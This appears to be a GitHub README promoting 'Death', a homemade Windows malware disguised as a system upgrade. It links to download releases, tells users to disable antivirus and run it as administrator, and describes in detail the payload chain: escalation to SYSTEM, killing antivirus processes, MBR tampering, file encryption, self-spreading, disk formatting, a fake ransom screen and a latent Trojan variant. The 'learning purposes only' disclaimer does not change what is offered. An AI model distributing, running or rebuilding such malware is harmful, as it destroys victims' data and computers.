## Warning

This is a computer virus that is extremely harmful and contagious , this virus will encrypt files , damage computers , spread through a variety of media , for learning purposes only , there is currently no antidote program developed , please do not download and run without professional guidance and do not read the following instructions ! Before running the program , please ensure that you have fully understood the seriousness of this behavior and the possible losses , if any misbehavior , you will be responsible for all the consequences , and has nothing to do with the author ! Data is priceless , hereby declare !

## Introduce

**Death** is a dangerous homemade computer virus for learning and research purposes only , disguised as a *Windows* system upgrade program , it can encrypt files , damage computers and spread through multiple media , it infects *Windows 7* and above on x86 and x64 architectures , it is not supported by some system versions , it works best on *Windows 10* or *Windows 11* , it is supported by a limited number of systems at present . The best results are achieved on *Windows 10* or *Windows 11* , and only a few languages are currently supported .

## Development Background

In the past , when antivirus software was not yet developed and there was a lack of general knowledge about computer security , many people were susceptible to various computer viruses while surfing the Internet , and I was one of them .

At that time , I suffered a lot from computer viruses . Traveling with family members to take photos , stored in the computer in less than a few days was encrypted by ransomware , want to play a small game on Baidu , but mistakenly into the phishing site , and finally under a bunch of rogue ads , chatting with friends on QQ , friends sent an exe file , curious to click in to see it but was changed MBR ......

In one experience , I learned how to reinstall the system , repair sectors , restore backups , install reliable antivirus software , but also gradually figured out the general virus routine . Since then , my computer basically has not been hit by any virus . At the same time , I also slowly discovered that the current computer viruses , most of the limitations are very large , limited to purely change the registry , change the MBR , encrypted files , etc. or pure showmanship , at most , can only hurt some computer novices , a little bit of understanding of the use of a PE will be able to easily solve all the problems . I even joked with myself at the time that I might be able to make a virus out myself .

In 2020 , because of the COVID-19 stayed at home , I have nothing to do , but a sudden thought : since the virus is so rampant outside , so why can not I write a computer virus , the previous joke into reality , to fight fire with fire ?

I sat down in front of the computer and started to think about the name of the computer virus . I hope that this virus is able to outperform the general virus , with a variety of attack methods , with a certain degree of danger , with a certain degree of contagiousness , with a certain degree of horror , with a certain degree of artistry and only for learning purposes , I think that only one name can meet my imagination of it : **Death** . It just so happens that there is no known computer virus with this name , so I adopted this program , after a night of hard work , the first version of **Death** was born .

## Start Testing

1. Intend  
Before downloading our program, you need to pay attention to :  
  * Always run the program on a virtual appliance and make sure that the software you use to implement the virtual appliance is secure and reliable !  
  * Make sure your system is x86 and x64 *Windows* and the system version is not lower than *Windows 7* , and it works best on *Windows 10* or *Windows 11* .  
  * Disable all antivirus software and firewalls on both the virtual appliance and the target machine , completely isolate the network and files between the virtual appliance and the host computer , and put up a good defense on the host computer , just in case .  
  * Update the host computer's security patches with *Windows Update* and upgrade the software you use to implement the virtual appliance to the latest version to prevent viruses from penetrating through vulnerable virtual machines .
  * If accidentally , the encryption module of this virus encrypts your important files , you can contact us directly through the email provided in the " Support Us " section below , and we will provide you with decryption service free of charge .

2. Download  
Go to our [Repository](https://github.com/JiGuroLGC/Death) , open the `release` page , and download the [latest release software](https://github.com/JiGuroLGC/Death/releases) that matches your system environment .  
If you are a user in a special area and cannot access it due to the network environment , please go to other questions to view the answers .

3. Run  
Run the program as administrator , and enjoy !

##  Process Characteristics

**Death** has undergone certain anti-virus protection and compression , but it still cannot avoid being detected by anti-virus software . **Death** appears to be a disguised upgrade program . Once the program is run as an administrator , the program will start *DeathUp.exe* to actively elevate privileges to *SYSTEM* permissions , and unzip all required files to under the hidden folder of `C:\Death` , the front desk relies on *DeathVideo.exe* to pop up a full-screen window to play the upgraded video , kill the file explorer , open *DeathHook.exe* to block mouse and keyboard input , and open *DeathKiller.exe* to kill in a loop Anti-virus software process , start *DeathMBR.exe* , modify the sector and disable PE , start *DeathReg.exe* , rewrite the registry , start *DeathSend.exe* , spread the virus through various methods , start *DeathEncryption.exe* , encrypt others folder file , start the main program *DeathMain.exe* in the background , and perform various operations , such as deleting files , formatting disks , modifying power-on passwords , modifying file associations , modifying startup options , etc. At this point , the infected computer has been completely destroyed .

After *DeathMain.exe* performs a series of operations , it will wait for the upgrade video to finish playing . Once the video finishes playing , the main program will immediately launch *DeathTheme.exe* to change the theme of the computer to a horror theme , and pull up *DeathMusic.exe* to play the horror music and the ransom audio in a loop .

At the same time , *DeathWanning.exe* will open a top ransom pop-up window that cannot be closed , *DeathWanning.exe* will have a fake infection identifier and a payment countdown , the payment address is also fake . If the countdown is over , the computer will shut down with a blue screen and will never start up again .

Finally , **Death** will open the screen drawing program *DeathDrawscreen.exe* to draw various special effects patterns on the computer screen . The main program of **Death** will be stopped and the virus infection has ended .

The above is the entire process of the **Death** virus infecting a computer . The process may change as the virus is updated .

There are two variants of **Death** , one is the immediate version and the other is the Trojan latent version . The former directly releases the file , does not play the update video , and directly runs several major virus programs . The time from opening to the pop-up of the ransomware pop-up window is less than 20 seconds . The latter is to hide the process after releasing the file , run secretly in the background , lurk in the user's computer for several days , copy the backdoor software , spread it widely , and then run several major virus programs in the background at a set time without playing updates video .

In general , **Death** uses a program disguised as a *Windows* upgrade to run virus programs in the background , making people infected unknowingly . It is dangerous , scary , artistic , highly contagious , and highly concealable .
